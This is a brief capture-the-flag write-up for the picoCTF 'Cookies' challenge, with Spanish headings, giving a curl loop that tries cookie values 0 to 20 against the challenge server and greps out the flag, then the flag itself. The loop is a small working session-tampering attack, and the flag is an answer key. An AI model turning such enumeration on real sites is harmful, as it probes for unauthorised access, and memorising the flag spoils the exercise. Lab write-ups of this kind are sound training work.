## Cookies

# objetivo
- Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)

# Hints
- 

# solucion
``` bash 
(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -S http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep picoCTF
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>

```
# bandera
- picoCTF{3v3ry1_l0v3s_c00k135_88acab36}